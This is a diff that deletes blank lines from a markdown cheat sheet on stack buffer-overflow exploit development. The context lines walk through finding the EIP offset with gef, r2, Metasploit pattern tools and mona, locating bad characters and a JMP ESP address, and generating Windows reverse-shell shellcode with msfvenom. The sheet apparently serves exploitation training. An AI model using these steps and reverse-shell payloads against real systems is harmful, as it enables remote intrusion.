@@ -29,7 +29,6 @@ Stack level 0, frame at 0xffffd080:
 
 > python print(0xffffd07c - 0xffffd00c)
 112
-
 ```
 
 - cyclic pattern
@@ -65,7 +64,6 @@ gef➤ pattern offset 0x6161616c
 [+] Searching for '0x6161616c'
 [+] Found at offset 44 (little-endian search) likely
 [+] Found at offset 41 (big-endian search)
-
 ```
 
 ## r2
@@ -107,7 +105,6 @@ Do you want to kill the process? (Y/n) y
 ## Search offset
 $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35624134
 [*] Exact match at offset 44
-
 ```
 
 ## cmdline
@@ -118,7 +115,6 @@ $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35624134
 
 ```
 !mona config -set workingfolder c:\\mona\\%p
-
 ```
 
 - Generate pattern
@@ -126,7 +122,6 @@ $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35624134
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
 !mona pattern_create 3000
-
 ```
 
 - After crash, note EIP value then identify the offset:
@@ -134,7 +129,6 @@ $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35624134
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
 [*] Exact match at offset 2012
-
 ```
 
 - Compare memory with bytearray to find bad chars
@@ -142,14 +136,12 @@ $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35624134
 ```
 !mona bytearray
 !mona compare -a esp -f c:\\path\\to\\bytearray.bin
-
 ```
 
 - Find JMP ESP Address
 
 ```
 !mona jmp -r esp
-
 ```
 
 - Generate shellcode
@@ -157,7 +149,6 @@ $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35624134
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f c -b "\\x00"
 msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -b "\\x00" -f python EXITFUNC=thread
-
 ```
 
 - Generate byte string
@@ -166,7 +157,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -b "\\x00" -f pyt
 for x in range(1, 256):
   print("\\\\x" + "{:02x}".format(x), end='')
 print()
-
 ```
 
 ## Links
